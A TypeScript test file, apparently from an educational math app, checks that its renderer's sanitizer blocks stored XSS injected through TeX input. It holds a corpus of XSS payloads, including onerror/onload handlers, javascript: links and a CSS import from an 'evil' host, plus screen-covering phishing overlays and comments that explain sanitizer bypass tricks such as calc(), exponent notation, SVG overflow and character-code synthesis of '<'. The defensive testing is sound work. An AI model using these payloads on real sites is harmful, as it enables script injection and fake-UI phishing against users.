import { Window } from "happy-dom";
import { describe, expect, it } from "vitest";

import { convertLatexToMarkupCached } from "@/lib/math-tex";
import { DEFAULT_MATH_RENDER_ENVIRONMENT } from "@/lib/math-environment";

import { renderMathHtml } from "./math-html";
import { sanitizeMathMarkup } from "./math-markup";
import {
  MATH_MARKUP_ALLOWED_ATTRIBUTES,
  MATH_MARKUP_ALLOWED_STYLE_PROPERTIES,
  MATH_MARKUP_ALLOWED_TAGS,
} from "./math-markup";

/**
 * 本文数式の stored XSS を出口で固定する。教材の TeX は import・クラウド共有・AI 生成・MCP から
 * 入り、`sigma-doc-schema.ts` の `tex: z.string()` は文字を一切制約しない。MathLive は text モードの
 * 中身を無加工で markup へ書き出し、それが `dangerouslySetInnerHTML` に入る。レンダラに CSP は
 * 無く `desktopAPI` (ファイル読み書き・AI 実行) が露出しているので、成立すれば影響は大きい。
 *
 * 判定は正規表現ではなく happy-dom で実際にパースして DOM を検査する。エスケープ済みテキストにも
 * `onerror=` や `javascript:` の**文字列**は残るので、素朴な部分一致は偽陽性を量産する。
 */
interface MarkupAudit {
  borrowedClassTokens: string[];
  disallowedAttributes: string[];
  disallowedTags: string[];
  eventHandlerAttributes: string[];
  screenCoveringStyles: string[];
  urlBearingElements: string[];
}

/** そのクラストークンが数式レンダラ由来として通るか (アプリの CSS クラスの借用検出)。 */
function isRendererClassToken(token: string): boolean {
  return sanitizeMathMarkup(`<span class="${token}"></span>`).html === `<span class="${token}"></span>`;
}

/**
 * 画面を覆うための最小道具立て。スクリプトが実行できなくても偽の UI は作れる。
 *
 * **実効寸法で判定する**。以前は `position:(fixed|sticky)` / viewport 単位 / `z-index:\d{3,}` の
 * 正規表現だけだったので、`position:absolute` + `width:1e5em` + `z-index:1e5` (どれも文字列としては
 * 素朴なパターンに当たらない) を素通ししていた。
 *
 * 評価器は **サニタイザの実装を一切 import せず独立に書く**。サニタイザの `evaluateCssCalc` を
 * 借りると、サニタイザ側のバグをテスト側が同じバグで見逃す (自分のバグを自分で隠す) 構図になる。
 */

/** 1 単位あたりの em 換算。`%` は 0 — 行内数式の親要素幅に対する割合は単体で画面を覆えない。 */
const CSS_UNIT_IN_EM: Readonly<Record<string, number>> = {
  "": 1, em: 1, rem: 1, ex: 1, ch: 1, pc: 1,
  px: 1 / 16, pt: 1 / 12, cm: 2.362, mm: 0.2362, in: 6, q: 0.0591,
  "%": 0,
};

const SCREEN_COVERING_EM = 50;
const SCREEN_COVERING_Z_INDEX = 100;
const VIEWPORT_OR_CONTAINER_UNIT = /\d\s*(?:[sldp]?v(?:h|w|i|b|min|max)|cq(?:w|h|i|b|min|max))\b/i;

/**
 * `<number><unit>` と `+ - * / ( ) calc()` だけの式を em 換算の実効値へ評価する小さな評価器。
 * 読めなければ `null` (= 判定材料にしない)。
 */
function effectiveEmValue(value: string): number | null {
  const tokens = value.toLowerCase().match(
    /calc|[-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:e[-+]?\d+)?(?:%|[a-z]+)?|[-+*/()]|\S/g,
  );
  if (!tokens) {
    return null;
  }
  let cursor = 0;
  const sum = (depth: number): number | null => {
    if (depth > 16) {
      return null;
    }
    let left = product(depth);
    while (left !== null && (tokens[cursor] === "+" || tokens[cursor] === "-")) {
      const operator = tokens[cursor];
      cursor += 1;
      const right = product(depth);
      left = right === null ? null : operator === "+" ? left + right : left - right;
    }
    return left;
  };
  const product = (depth: number): number | null => {
    let left = atom(depth);
    while (left !== null && (tokens[cursor] === "*" || tokens[cursor] === "/")) {
      const operator = tokens[cursor];
      cursor += 1;
      const right = atom(depth);
      left = right === null || (operator === "/" && right === 0)
        ? null
        : operator === "*" ? left * right : left / right;
    }
    return left;
  };
  const atom = (depth: number): number | null => {
    if (tokens[cursor] === "calc") {
      cursor += 1;
    }
    if (tokens[cursor] === "(") {
      cursor += 1;
      const inner = sum(depth + 1);
      if (inner === null || tokens[cursor] !== ")") {
        return null;
      }
      cursor += 1;
      return inner;
    }
    const token = tokens[cursor];
    const match = token
      ? /^([-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:e[-+]?\d+)?)(%|[a-z]*)$/.exec(token)
      : null;
    if (!match) {
      return null;
    }
    cursor += 1;
    const scale = CSS_UNIT_IN_EM[match[2]];
    return scale === undefined ? null : Number(match[1]) * scale;
  };
  const result = sum(0);
  return result !== null && cursor === tokens.length && Number.isFinite(result) ? result : null;
}

function isScreenCoveringStyle(style: string): boolean {
  if (VIEWPORT_OR_CONTAINER_UNIT.test(style)) {
    return true;
  }
  const declarations = new Map<string, string>();
  for (const declaration of style.split(";")) {
    const separator = declaration.indexOf(":");
    if (separator > 0) {
      declarations.set(
        declaration.slice(0, separator).trim().toLowerCase(),
        declaration.slice(separator + 1).trim().toLowerCase(),
      );
    }
  }

  const position = declarations.get("position");
  if (position === "fixed" || position === "sticky") {
    return true;
  }
  const zIndex = Number(declarations.get("z-index"));
  if (Number.isFinite(zIndex) && Math.abs(zIndex) >= SCREEN_COVERING_Z_INDEX) {
    return true;
  }
  if (position !== "absolute") {
    return false;
  }
  const spans = (properties: readonly string[]): boolean => properties.some((property) => {
    const raw = declarations.get(property);
    const effective = raw === undefined ? null : effectiveEmValue(raw);
    return effective !== null && Math.abs(effective) >= SCREEN_COVERING_EM;
  });
  // `font-size` も箱の道具立てになる: 1 文字を巨大なグリフとして描けば面は覆える。
  return spans(["width", "min-width", "max-width"])
    || spans(["height", "min-height", "max-height"])
    || spans(["font-size"]);
}

/**
 * SVG 要素そのものが主張するレイアウト箱。`style` を 1 文字も使わずに `<svg width height>` だけで
 * 不透明な面を描けるので、`style` 属性だけを見る監査ではこの経路が丸ごと見えない。
 * 幅は MathLive が伸縮矢印に `width="400em"` を実出力するため判定に使えない (帯であって覆いではない)。
 */
function isScreenCoveringSvgBox(element: Element): boolean {
  if (element.tagName.toLowerCase() !== "svg") {
    return false;
  }
  const height = effectiveEmValue(element.getAttribute("height") ?? "");
  return height !== null && Math.abs(height) >= SCREEN_COVERING_EM;
}

/** ユーザー単位の生の数値。path データは `v40` のように直前が英字になる。 */
const SVG_USER_SPACE_NUMBER = /-?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][-+]?\d+)?/g;

/**
 * SVG の子要素が **svg の箱の何倍**を占めるか。`overflow:visible` はビューポートのクリップを
 * 外すので、`ユーザー単位 / viewBox 範囲` がそのまま「svg の寸法の何倍が描かれるか」になる。
 * サニタイザの予算計算とは独立に、祖先 svg を辿って自前で求める。
 */
function svgChildOverflowRatio(element: Element): number {
  const svg = element.closest?.("svg") ?? null;
  if (!svg || svg === element) {
    return 0;
  }
  const viewBox = (svg.getAttribute("viewBox") ?? "").trim().split(/[\s,]+/).map(Number);
  const extent = viewBox.length === 4 && viewBox.every((value) => Number.isFinite(value))
    ? Math.max(Math.abs(viewBox[2]), Math.abs(viewBox[3]))
    // viewBox が無ければユーザー単位 = CSS px。svg の箱は em 指定なので 16px を 1 単位とみなす。
    : 16;
  if (extent <= 0) {
    return 0;
  }
  let worst = 0;
  for (const name of element.getAttributeNames()) {
    if (!/^(?:d|points|transform|x|y|x1|y1|x2|y2|width|height|r|rx|ry|cx|cy)$/.test(name)) {
      continue;
    }
    const value = element.getAttribute(name) ?? "";
    if (/%|em|px|pt/i.test(value)) {
      continue;
    }
    const scaling = /(?:scale[XY]?|matrix)\s*\(([^)]*)\)/i.exec(value);
    for (const token of (scaling?.[1] ?? value).matchAll(SVG_USER_SPACE_NUMBER)) {
      // `scale()` はユーザー単位そのものを倍にするので、倍率をそのまま比に載せる。
      worst = Math.max(worst, Math.abs(Number(token[0])) * (scaling ? extent : 1));
    }
  }
  return worst / extent;
}

/** svg の高さ上限 (20em) の何倍まで許すか。これを超えると被覆しきい値 50em を越えうる。 */
const SVG_CHILD_OVERFLOW_RATIO_LIMIT = 2.5;

/** `renderMathHtml` が markup 生成に失敗したときに付ける印。CSS は持たない。 */
const RENDER_FALLBACK_ATTRIBUTE = "data-math-unrendered";

function auditMathMarkup(html: string): MarkupAudit {
  const window = new Window();
  const root = window.document.createElement("div");
  root.innerHTML = html;

  const audit: MarkupAudit = {
    borrowedClassTokens: [],
    disallowedAttributes: [],
    disallowedTags: [],
    eventHandlerAttributes: [],
    screenCoveringStyles: [],
    urlBearingElements: [],
  };

  const visit = (element: Element) => {
    const tag = element.tagName.toLowerCase();
    if (!MATH_MARKUP_ALLOWED_TAGS.has(tag)) {
      audit.disallowedTags.push(tag);
    }
    if (isScreenCoveringSvgBox(element)) {
      audit.screenCoveringStyles.push(`${tag}[height=${element.getAttribute("height")}]`);
    }
    const overflowRatio = svgChildOverflowRatio(element);
    if (overflowRatio > SVG_CHILD_OVERFLOW_RATIO_LIMIT) {
      audit.screenCoveringStyles.push(`${tag}[×${overflowRatio.toFixed(1)} of its viewBox]`);
    }
    for (const name of element.getAttributeNames()) {
      if (/^on/i.test(name)) {
        audit.eventHandlerAttributes.push(name);
      }
      if (/^(?:href|src|srcdoc|xlink:href|formaction|action)$/i.test(name)) {
        audit.urlBearingElements.push(`${tag}[${name}]`);
      }
      if (!MATH_MARKUP_ALLOWED_ATTRIBUTES.has(name) && name !== RENDER_FALLBACK_ATTRIBUTE) {
        audit.disallowedAttributes.push(`${tag}[${name}]`);
      }
      if (name === "style" && isScreenCoveringStyle(element.getAttribute(name) ?? "")) {
        audit.screenCoveringStyles.push(`${tag}[${element.getAttribute(name)}]`);
      }
      if (name === "class") {
        audit.borrowedClassTokens.push(
          ...(element.getAttribute(name) ?? "").split(/\s+/)
            .filter((token) => token && !isRendererClassToken(token)),
        );
      }
    }
    for (const child of Array.from(element.children as unknown as ArrayLike<Element>)) {
      visit(child);
    }
  };

  for (const child of Array.from(root.children as unknown as ArrayLike<Element>)) {
    visit(child);
  }
  window.close();
  return audit;
}

function markupTagNames(markup: string): string[] {
  return [...markup.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9-]*)/g)]
    .map((match) => match[1].toLowerCase());
}

function markupStyleDeclarations(markup: string): string[] {
  return [...markup.matchAll(/\sstyle\s*=\s*(?:"([^"<]*)"|'([^'<]*)'|([^\s"'`=<>]+))/g)]
    .flatMap((match) => (match[1] ?? match[2] ?? match[3] ?? "").split(";"))
    .map((declaration) => declaration.trim())
    .filter(Boolean);
}

function markupStyleProperties(markup: string): string[] {
  return markupStyleDeclarations(markup)
    .map((declaration) => declaration.slice(0, declaration.indexOf(":")).trim().toLowerCase())
    .filter(Boolean);
}

function markupClassTokens(markup: string): string[] {
  return [...markup.matchAll(/\sclass\s*=\s*(?:"([^"<]*)"|'([^'<]*)'|([^\s"'`=<>]+))/g)]
    .flatMap((match) => (match[1] ?? match[2] ?? match[3] ?? "").split(/\s+/))
    .filter(Boolean);
}

function markupAttributeNames(markup: string): string[] {
  return [...markup.matchAll(/<[a-zA-Z][a-zA-Z0-9-]*((?:\s+[a-zA-Z_:][a-zA-Z0-9_:.-]*(?:\s*=\s*(?:"[^"<]*"|'[^'<]*'|[^\s"'`=<>]+))?)*)\s*\/?>/g)]
    // 値まで一緒に食い潰す。食い潰さないと `style="border:1px solid …"` の `solid` や
    // path データの断片を属性名だと読み違える。
    .flatMap((match) => [...match[1].matchAll(/([a-zA-Z_:][a-zA-Z0-9_:.-]*)(?:\s*=\s*(?:"[^"<]*"|'[^'<]*'|[^\s"'`=<>]+))?/g)]
      .map((attribute) => attribute[1]));
}

/** タグ名・属性・テキストだけに落とした DOM の写し。無害化の前後を比べるために使う。 */
function domSnapshot(html: string): string {
  const window = new Window();
  const root = window.document.createElement("div");
  root.innerHTML = html;

  const serialize = (node: Node): string => {
    if (node.nodeType === 3) {
      return JSON.stringify(node.textContent ?? "");
    }
    if (node.nodeType !== 1) {
      return "";
    }
    const element = node as Element;
    const attributes = element.getAttributeNames().sort()
      .map((name) => `${name}=${JSON.stringify(element.getAttribute(name) ?? "")}`)
      .join(" ");
    const children = Array.from(element.childNodes as unknown as ArrayLike<Node>)
      .map(serialize)
      .join("");
    return `<${element.tagName.toLowerCase()} ${attributes}>${children}</>`;
  };

  const snapshot = Array.from(root.childNodes as unknown as ArrayLike<Node>)
    .map(serialize)
    .join("");
  window.close();
  return snapshot;
}

/**
 * 攻撃コーパス。10-13 は「生 HTML を通す 10 コマンド」(実測: `\text` `\mbox` `\textbf` `\textit`
 * `\textrm` `\texttt` `\textsf` `\textup` `\textnormal` `\operatorname`) の網羅。
 * 16-17 は markup 生成そのものが throw する TeX (`renderMathHtml` が throw しないことの確認)。
 * 23-26 は文字コード合成 (後述)。
 */
const ATTACK_CORPUS = [
  String.raw`\text{<img src=x onerror=alert(1)>}`,
  String.raw`\mbox{<script>alert(1)</script>}`,
  String.raw`\text{"><svg onload=alert(1)>}`,
  String.raw`\text{<iframe src=javascript:alert(1)></iframe>}`,
  String.raw`\text{<a href="javascript:alert(1)">x</a>}`,
  String.raw`\text{</span><img src=x onerror=alert(1)><span>}`,
  String.raw`\text{<style>@import url(https://evil/)</style>}`,
  String.raw`\text{<!--><img src=x onerror=alert(1)>-->}`,
  String.raw`\text{<svg><animate onbegin=alert(1)/></svg>}`,
  String.raw`\textbf{<img src=x onerror=alert(1)>}`,
  String.raw`\textrm{<img src=x onerror=alert(1)>}`,
  String.raw`\texttt{<img src=x onerror=alert(1)>}`,
  String.raw`\operatorname{<img src=x onerror=alert(1)>}`,
  String.raw`\htmlData{onload=alert(1)}{x}`,
  String.raw`\style{background:url(https://evil/x)}{y}`,
  String.raw`\class{x" onmouseover="alert(1)}{y}`,
  String.raw`\href{javascript:alert(1)}{x}`,
  String.raw`\style{position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:#fff;z-index:2147483647}{PHISH}`,
  String.raw`\text{<span style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:2147483647>PHISH</span>}`,
  String.raw`\text{<span style=position:absolute;top:0;left:0;width:9999em;height:9999em;background-color:#ffffff;z-index:10>COVERED</span>}`,
  // 指数表記と calc() は素朴なトークン走査を抜ける (`1e5em` の `5` は直前が `e` なので数えられず、
  // `calc(99em*99)` は 99 が 2 つに見える)。どちらも実効値は画面を覆える大きさ。
  String.raw`\text{<span style=position:absolute;top:0;left:0;width:1e5em;height:1e5em;background-color:#ffffff;z-index:1e5>COVERED</span>}`,
  String.raw`\text{<span style=position:absolute;top:0;left:0;width:calc(99em*99);height:calc(19em*3);background-color:#ffffff>COVERED</span>}`,
  // 単位混在の calc は畳み込み値を小さく見せる (`calc(400em - 399px)` は 1 に見えて実効 6001px)。
  String.raw`\text{<span style=position:absolute;top:calc(-40em + 39px);left:calc(-40em + 39px);width:calc(400em - 399px);height:calc(400em - 399px);background-color:#ffffff;z-index:10>COVERED</span>}`,
  // 絶対単位は viewport 単位の禁止をすり抜ける。
  String.raw`\text{<span style=position:absolute;top:-20in;left:-20in;width:100in;height:20in;background-color:#ffffff;z-index:10>COVERED</span>}`,
  // ベンダー別名の calc と、禁止リストに無い数学関数。
  String.raw`\text{<span style=position:absolute;width:-webkit-calc(99em*99);height:-webkit-calc(20em*20);background-color:#ffffff>COVERED</span>}`,
  String.raw`\text{<span style=position:absolute;width:calc-size(0px,100em*100);height:calc-size(0px,20em*20);background-color:#ffffff>COVERED</span>}`,
  // `em` は要素自身の font-size に対して解かれるので、入れ子で掛け算になる。
  String.raw`\text{<span style=font-size:999em><span style=position:absolute;width:99em;height:19em;background-color:#ffffff>COVERED</span></span>}`,
  // CSS を 1 文字も使わずに面を描く経路。
  String.raw`\text{<span style=position:absolute;z-index:10><svg width=9999 height=9999><rect width=9999 height=9999 fill=#ffffff></rect></svg></span>}`,
  // `overflow:visible` は SVG ビューポートのクリップを外すので、子要素が svg の箱の外側へ描かれる
  // — `<svg height>` の上限も CSS の寸法上限も迂回される。
  String.raw`\text{<svg style=overflow:visible width=1em height=1em><rect x=0 y=0 width=99999 height=99999 fill=#ffffff></rect></svg>}`,
  String.raw`\text{<svg style=overflow:visible;position:absolute;top:0;left:0 width=1em height=1em><rect width=99999 height=99999 fill=#ffffff></rect></svg>}`,
  String.raw`\text{<svg style=overflow:visible width=1em height=1em><path d=M0,0L99999,0L99999,99999L0,99999Z fill=#ffffff></path></svg>}`,
  String.raw`\text{<svg style=overflow:visible width=1em height=1em><g transform=scale(99999)><rect width=10 height=10 fill=#ffffff></rect></g></svg>}`,
  // 幾何値ではなく線幅で面を作る経路。
  String.raw`\text{<svg style=overflow:visible width=1em height=1em viewBox=0,0,1,1><rect width=1 height=1 stroke-width=99999></rect></svg>}`,
  // 高さ指定の無い svg は、上限の無い `width` と viewBox の縦横比から高さが決まる。
  String.raw`\text{<svg viewBox=0,0,100,100 width=400em><rect width=100 height=100 fill=#ffffff></rect></svg>}`,
  String.raw`\text{<span class=startup-splash>アカウントがロックされました</span>}`,
  String.raw`\htmlClass{startup-splash}{x}`,
  // 文字コード合成。`\char"3C` / `\unicode{"3C}` は TeX ソースに `<` を 1 文字も書かずに
  // MathLive へ生の `<` を合成させる。「入口 (TeX) で危険文字を弾く」方式が原理的に成立しない
  // ことの実例で、出口の許可リストで守っている根拠そのもの。TeX 側の表現は無数にあるので、
  // 危険文字の入口フィルタは常にこの手の合成で回り込まれる。
  String.raw`\text{\char"3C img src=x onerror=alert(1)\char"3E}`,
  String.raw`\text{\char"3Cimg src=x onerror=alert(1)\char"3E}`,
  String.raw`\char"3C script\char"3E alert(1)\char"3C/script\char"3E`,
  String.raw`\text{\unicode{"3C}img src=x onerror=alert(1)\unicode{"3E}}`,
];

/** 既存の見た目を壊していないことを測る非退行コーパス。 */
const NON_REGRESSION_CORPUS = [
  "x^2",
  String.raw`\frac{1}{2}`,
  String.raw`\sqrt{x}`,
  String.raw`\sum_{i=1}^{n}`,
  String.raw`\int_0^1 f(x)dx`,
  String.raw`\begin{aligned}x&=1\\y&=2\end{aligned}`,
  String.raw`\begin{pmatrix}1&2\\3&4\end{pmatrix}`,
  String.raw`\begin{cases}x&=1\\y&=2\end{cases}`,
  String.raw`\begin{array}{cc}1&2\\3&4\end{array}`,
  String.raw`\text{面積}`,
  String.raw`\text{答えは }x=1\text{ です}`,
  String.raw`\placeholder{}`,
  String.raw`\overrightarrow{AB}`,
  String.raw`\underbrace{x+y}_{z}`,
  String.raw`\xrightarrow{f}`,
  String.raw`\overline{AB}`,
  String.raw`\boxed{x}`,
  String.raw`\left(\frac{a}{b}\right)`,
  String.raw`\lim_{x\to0}`,
  String.raw`\dots`,
  String.raw`\mathbb{R}`,
  "a<b",
  String.raw`a\&b`,
  String.raw`x\iff y`,
  String.raw`x=1\\y=2`,
  String.raw`90^\circ`,
  String.raw`\sin\theta`,
];

/**
 * 生 markup の時点でブラウザが別物としてパースする TeX。MathLive は math モードでも
 * `a<b` の `<` を裸で吐くので、無害化前と後で DOM が一致しなくて**正しい**。
 */
const RAW_MARKUP_BROKEN_CORPUS = ["a<b"];

/** インライン `style` を厚く出す TeX。CSS プロパティの許可リストを実測で固定するために使う。 */
const STYLE_HEAVY_CORPUS = [
  String.raw`\colorbox{yellow}{z}`,
  String.raw`\textcolor{blue}{y}`,
  String.raw`\color{red}{x}`,
  String.raw`\cancel{x}`,
  String.raw`\enclose{circle}{x}`,
  String.raw`\bbox[5px,border:1px solid red]{x}`,
  String.raw`\rule{1em}{2em}`,
  String.raw`\phantom{x}`,
  String.raw`\raisebox{1em}{x}`,
  String.raw`\Bigg[x\Bigg]`,
  String.raw`\substack{a\\b}`,
  String.raw`\begin{smallmatrix}1&2\end{smallmatrix}`,
  String.raw`\genfrac{}{}{0pt}{}{a}{b}`,
  String.raw`\hspace{2em}`,
  String.raw`\smash{y}`,
  String.raw`\stackrel{a}{=}`,
  String.raw`\binom{n}{k}`,
  String.raw`\huge x`,
  String.raw`\underline{x}`,
  String.raw`\widehat{ABC}`,
  String.raw`\overbrace{a}^{b}`,
];

describe("renderMathHtml stored XSS surface", () => {
  it.each(ATTACK_CORPUS)("never emits an executable element for %s", (tex) => {
    const html = renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT);
    const audit = auditMathMarkup(html);

    expect(audit.disallowedTags).toEqual([]);
    expect(audit.disallowedAttributes).toEqual([]);
    expect(audit.eventHandlerAttributes).toEqual([]);
    expect(audit.urlBearingElements).toEqual([]);
    // スクリプトが実行できなくても、画面を覆えば偽の UI もクリックジャッキングも作れる。
    // インライン CSS だけでなく、アプリ自身の CSS クラスを名指しする経路も塞ぐ。
    expect(audit.screenCoveringStyles).toEqual([]);
    expect(audit.borrowedClassTokens).toEqual([]);
  });

  it("still blocks the payload when TeX never spells the angle bracket out", () => {
    // 上のコーパス 23-26 が空振りしていないことの裏取り。TeX ソースに `<` は 1 文字も無いのに、
    // 無害化前の markup には**生きた** `<img src=x onerror=alert(1)>` が立っている
    // (= 入口で危険文字を弾いても防げない。だから出口の許可リストで守る)。
    for (const tex of [
      String.raw`\text{\char"3Cimg src=x onerror=alert(1)\char"3E}`,
      String.raw`\text{\unicode{"3C}img src=x onerror=alert(1)\unicode{"3E}}`,
    ]) {
      expect(tex).not.toContain("<");
      const rawAudit = auditMathMarkup(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT));
      expect(rawAudit.disallowedTags, tex).toContain("img");
      expect(rawAudit.eventHandlerAttributes, tex).toContain("onerror");

      expect(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT), tex).toContain("&lt;img");
      expect(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT), tex).not.toContain("data-math-unrendered");
    }
  });

  it("never throws, even for TeX whose markup generation fails", () => {
    // `validateLatex` を通るのに markup 生成が throw する TeX がある。描画中の throw は
    // React がツリーごと捨てて画面が真っ白になるので、必ず素の TeX 表示へ落とす。
    for (const tex of [...ATTACK_CORPUS, ...NON_REGRESSION_CORPUS, "", "\\"]) {
      expect(() => renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT), tex).not.toThrow();
    }
    expect(renderMathHtml(String.raw`\href{javascript:alert(1)}{x}`, DEFAULT_MATH_RENDER_ENVIRONMENT))
      .toBe('<span data-math-unrendered="true">\\href{javascript:alert(1)}{x}</span>');
    expect(renderMathHtml(String.raw`\class{x" onmouseover="alert(1)}{y}`, DEFAULT_MATH_RENDER_ENVIRONMENT))
      .toContain('data-math-unrendered="true"');
  });

  it("keeps the raw TeX fallback readable and escaped", () => {
    const html = renderMathHtml(String.raw`\href{javascript:<img src=x onerror=alert(1)>}{x}`, DEFAULT_MATH_RENDER_ENVIRONMENT);

    expect(auditMathMarkup(html).disallowedTags).toEqual([]);
    expect(html).toContain("&lt;img");
  });

  it("does not fall back to raw TeX for ordinary formulas", () => {
    // fail-closed の罠: フォールバックが常に発火するとテストは緑のまま画面だけ生 TeX になる。
    for (const tex of [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]) {
      expect(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT), tex).not.toContain("data-math-unrendered");
    }
  });

  it("keeps the rendering details other surfaces depend on", () => {
    expect(renderMathHtml("x^2", DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("ML__latex");
    expect(renderMathHtml(String.raw`x\iff y`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("⟺");
    expect(renderMathHtml("x=高さ", DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("ML__text");
    expect(renderMathHtml(String.raw`\placeholder{}`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("ML__prompt");
    expect(renderMathHtml(String.raw`x=1\\y=2`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("ML__mtable");
    expect(renderMathHtml(String.raw`\begin{aligned}x&=1\\y&=2\end{aligned}`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("ML__mtable");
    expect(renderMathHtml(String.raw`\dots`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("katex");
    expect(renderMathHtml(String.raw`\overrightarrow{AB}`, DEFAULT_MATH_RENDER_ENVIRONMENT)).toContain("<svg");
    expect(renderMathHtml(String.raw`x\iff y`, DEFAULT_MATH_RENDER_ENVIRONMENT)).not.toContain("ML__error");
  });

  it("leaves no bare angle bracket in text position so SVG export stays valid XML", () => {
    // `rich-text-html.ts` の `mathBody` はこの文字列を `<foreignObject>` へそのまま連結する。
    // MathLive は `a<b` に裸の `<` を吐くので、以前はここで XML として不正な SVG になっていた。
    const html = renderMathHtml("a<b", DEFAULT_MATH_RENDER_ENVIRONMENT);

    expect(html).toContain("&lt;");
    expect(auditMathMarkup(html).disallowedTags).toEqual([]);
    for (const tex of NON_REGRESSION_CORPUS) {
      const text = renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT).replace(/<[^>]*>/g, "");
      expect(text, tex).not.toMatch(/[<>]/);
    }
  });

  it("keeps the KaTeX branch under the same allow-list", () => {
    // KaTeX は `trust:false` で既に安全だが、その根拠はテストで固定されていなかった。
    const html = renderMathHtml(String.raw`\dots\text{<img src=x onerror=alert(1)>}`, DEFAULT_MATH_RENDER_ENVIRONMENT);

    expect(html).not.toContain("<img");
    expect(auditMathMarkup(html).disallowedTags).toEqual([]);
  });
});

describe("math markup allow-list gatekeeper", () => {
  // MathLive / KaTeX の版上げで新しいタグや属性が出たら赤くなる。ここが赤いときは
  // 「サニタイザが正当な数式を壊し始めた」合図なので、許可リストを実測に合わせて更新する。
  it("covers every tag the renderers actually produce", () => {
    const produced = new Set(
      [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
        .flatMap((tex) => markupTagNames(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT))),
    );

    expect(produced.size).toBeGreaterThan(0);
    expect([...produced].filter((tag) => !MATH_MARKUP_ALLOWED_TAGS.has(tag))).toEqual([]);
  });

  it("covers every attribute the renderers actually produce", () => {
    const produced = new Set(
      [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
        .flatMap((tex) => markupAttributeNames(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT))),
    );

    expect(produced.size).toBeGreaterThan(0);
    expect([...produced].filter((name) => !MATH_MARKUP_ALLOWED_ATTRIBUTES.has(name))).toEqual([]);
  });

  it("covers every class token the renderers actually produce", () => {
    // クラスは文字種ではなくトークン単位の許可制なので、実測の取りこぼしは
    // 「正当な数式の組版が黙って崩れる」形で現れる。ここで版上げを検出する。
    const produced = [...new Set(
      [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
        .flatMap((tex) => markupClassTokens(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT))),
    )];

    expect(produced.length).toBeGreaterThan(0);
    expect(produced.filter((token) => (
      sanitizeMathMarkup(`<span class="${token}"></span>`).html !== `<span class="${token}"></span>`
    ))).toEqual([]);
  });

  it("keeps every style declaration the renderers actually produce", () => {
    // 寸法の上限が実測を割り込んでいないことの門番。割り込むと数式の組版が黙って崩れる。
    const produced = [...new Set(
      [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
        .flatMap((tex) => markupStyleDeclarations(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT))),
    )];

    expect(produced.length).toBeGreaterThan(0);
    expect(produced.filter((declaration) => (
      sanitizeMathMarkup(`<span style="${declaration}"></span>`).html !== `<span style="${declaration}"></span>`
    ))).toEqual([]);
  });

  it("covers every CSS property the renderers actually produce", () => {
    const produced = new Set(
      [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
        .flatMap((tex) => markupStyleProperties(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT))),
    );

    expect(produced.size).toBeGreaterThan(0);
    expect([...produced].filter((name) => !MATH_MARKUP_ALLOWED_STYLE_PROPERTIES.has(name))).toEqual([]);
  });

  it("renders the same DOM as the untouched renderer output for safe formulas", () => {
    // 無害化が正当な数式の見た目を 1 つも変えていないことの直接の証明。バイト列の一致では
    // なく DOM で比べるのは、MathLive が伸縮矢印に吐く引用符なしの属性値
    // (`width=400em`) を必ず引用符付きへ書き戻すため — DOM としては同じものになる。
    const comparable = [...NON_REGRESSION_CORPUS, ...STYLE_HEAVY_CORPUS]
      .filter((tex) => !RAW_MARKUP_BROKEN_CORPUS.includes(tex));

    expect(comparable.length).toBeGreaterThan(0);
    for (const tex of comparable) {
      expect(domSnapshot(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT)), tex)
        .toBe(domSnapshot(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT)));
    }
  });

  it("repairs the markup MathLive already emitted as invalid", () => {
    // `a<b` の生 markup は `<span class="ML__cmr"><</span>` で、ブラウザはこの `<` を
    // タグの開始として読んでしまう (= 生 markup の時点で DOM が壊れている)。
    // 無害化後はテキストの `<` になり、`<foreignObject>` に埋めても XML として妥当。
    for (const tex of RAW_MARKUP_BROKEN_CORPUS) {
      expect(domSnapshot(convertLatexToMarkupCached(tex, DEFAULT_MATH_RENDER_ENVIRONMENT)), tex).toContain("<< ");
      expect(domSnapshot(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT)), tex).not.toContain("<< ");
      expect(domSnapshot(renderMathHtml(tex, DEFAULT_MATH_RENDER_ENVIRONMENT)), tex).toContain('"<"');
    }
  });
});
